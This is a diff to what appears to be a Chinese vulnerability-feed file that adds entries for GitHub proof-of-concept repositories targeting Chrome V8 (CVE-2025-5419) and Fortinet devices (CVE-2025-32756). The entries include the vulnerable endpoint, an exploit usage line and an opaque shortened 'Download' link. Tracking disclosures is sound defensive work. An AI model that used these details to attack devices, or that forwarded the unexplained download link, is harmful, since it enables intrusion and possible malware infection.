@@ -4,6 +4,60 @@
   
   
   <entry>
+    <title>Chrome V8 越界读/写漏洞</title>
+    <link href="/2025/06/08/github_504656066/"/>
+    <url>/2025/06/08/github_504656066/</url>
+    
+    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Chrome V8 越界读&#x2F;写漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-5419</li></ul><p><strong>漏洞类型：</strong> 缓冲区溢出</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Chrome V8 引擎中存在越界读&#x2F;写漏洞，可能导致堆损坏进而实现远程代码执行（RCE）。此PoC仅用于教育和研究目的。</p><p><strong>产品厂商：</strong> Google</p><p><strong>产品名称：</strong> Chrome V8</p><p><strong>来源：</strong> <a href="https://github.com/lacelruz/CVE-2025-5419">https://github.com/lacelruz/CVE-2025-5419</a></p><p><strong>类型：</strong> CVE-2025:github search</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><br># CVE-<span class="hljs-number">2025</span>-<span class="hljs-number">5419</span><br><span class="hljs-keyword">Out</span>-<span class="hljs-keyword">of</span>-Bounds <span class="hljs-keyword">Read</span>/<span class="hljs-keyword">Write</span> <span class="hljs-keyword">in</span> Chrome V8 — Heap Corruption → RCE<br><br>This PoC <span class="hljs-keyword">is</span> provided <span class="hljs-keyword">for</span> educational <span class="hljs-keyword">and</span> research purposes only.<br>[Download](https:<span class="hljs-comment">//tinyurl.com/3ck8xy5c)</span><br><br><br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br><br><span class="hljs-bullet">- </span>README.md<br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Fortinet 缓冲区溢出漏洞</title>
+    <link href="/2025/06/08/github_1505601153/"/>
+    <url>/2025/06/08/github_1505601153/</url>
+    
+    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Fortinet 缓冲区溢出漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-32756</li></ul><p><strong>漏洞类型：</strong> 缓冲区溢出</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Fortinet多个产品中存在一个基于栈的缓冲区溢出漏洞（CWE-121），允许远程未经认证的攻击者通过发送带有特制hash cookie的HTTP请求执行任意代码或命令。受影响的端点包括&#x2F;remote&#x2F;hostcheck_validate中的enc参数处理，由于边界检查不当导致缓冲区溢出。</p><p><strong>产品厂商：</strong> Fortinet</p><p><strong>产品名称：</strong> FortiVoice, FortiRecorder, FortiMail, FortiNDR, FortiCamera</p><p><strong>影响版本：</strong> FortiVoice: 7.2.0, 7.0.0 through 7.0.6, 6.4.0 through 6.4.10; FortiRecorder: 7.2.0 through 7.2.3, 7.0.0 through 7.0.5, 6.4.0 through 6.4.5; FortiMail: 7.6.0 through 7.6.2, 7.4.0 through 7.4.4, 7.2.0 through 7.2.7, 7.0.0 through 7.0.8; FortiNDR: 7.6.0, 7.4.0 through 7.4.7, 7.2.0 through 7.2.4, 7.0.0 through 7.0.6; FortiCamera: 2.1.0 through 2.1.3, 2.0 all versions, 1.1 all versions</p><p><strong>来源：</strong> <a href="https://github.com/B1ack4sh/Blackash-CVE-2025-32756">https://github.com/B1ack4sh/Blackash-CVE-2025-32756</a></p><p><strong>类型：</strong> CVE-2025:github search</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs r"><br><span class="hljs-comment"># Blackash-CVE-2025-32756</span><br><br><span class="hljs-comment"># CVE-2025-32756 &#x27;Fortinet&#x27; RCE PoC ‼️</span><br><br><span class="hljs-comment"># Description:</span><br><br>A stack<span class="hljs-operator">-</span>based buffer overflow vulnerability <span class="hljs-punctuation">[</span>CWE<span class="hljs-operator">-</span><span class="hljs-number">121</span><span class="hljs-punctuation">]</span> <span class="hljs-keyword">in</span> Fortinet FortiVoice versions <span class="hljs-punctuation">\</span>`<span class="hljs-number">7.2</span>.0<span class="hljs-punctuation">\</span>`, \`7.0.0\` through \`7.0.6\`, \`6.4.0\` through \`6.4.10\`, FortiRecorder versions \`7.2.0\` through \`7.2.3\`, \`7.0.0\` through \`7.0.5\`, \`6.4.0\` through \`6.4.5\`, FortiMail versions \`7.6.0\` through \`7.6.2\`, \`7.4.0\` through \`7.4.4\`, \`7.2.0\` through \`7.2.7\`, \`7.0.0\` through \`7.0.8\`, FortiNDR versions \`7.6.0\`, \`7.4.0\` through \`7.4.7\`, \`7.2.0\` through \`7.2.4\`, \`7.0.0\` through \`7.0.6\`, FortiCamera versions \`2.1.0\` through \`2.1.3\`, 2.0 all versions, 1.1 all versions, allows a remote unauthenticated attacker to execute arbitrary code or commands via sending HTTP requests with specially crafted hash cookie.<br><br># Metrics:<br><br>CVSS 3.x Severity and Vector Strings:<br><br>CNA:  \`Fortinet\`, Inc. &#x27;Base Score&#x27;: 9.8 CRITICAL \`⚫\` Vector:  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H<br><br>The vulnerability exists in the processing of the enc parameter in the /remote/hostcheck_validate endpoint, where improper bounds checking allows buffer overflow.<br><br># Usage:<br><br>\`\`\`<br>python3 fortinet_cve_2025_32756_poc.py target_ip [-p port] [-d]<br>\`\`\`<br><br># Arguments:<br><br>+ \`target_ip\`: Target Fortinet device<br>+ \`-p, --port\`: Target port (default: 443)<br>+ \`-d, --debug\`: Enable debug output<br><br># Mitigation:<br><br>Update to patched versions:<br><br>+ \`FortiVoice\`: 7.2.1+, 7.0.7+, 6.4.11+<br>+ \`FortiMail\`: 7.6.3+, 7.4.5+, 7.2.8+, 7.0.9+<br>+ \`FortiNDR\`: 7.6.1+, 7.4.8+, 7.2.5+, 7.0.7+<br>+ \`FortiRecorder\`: 7.2.4+, 7.0.6+, 6.4.6+<br>+ \`FortiCamera\`: 2.1.4+<br><br># Disclaimer ⚠️<br><br>For educational and research purposes only. Use only against systems you own or have permission to test.<br><br><br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br><br><span class="hljs-bullet">- </span>README.md<br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CVE-2025:github search</tag>
+      
+      <tag>缓冲区溢出</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Checkpoint Security Gateway Arbitrary File Read Vulnerability</title>
     <link href="/2025/06/08/github_2661680703/"/>
     <url>/2025/06/08/github_2661680703/</url>
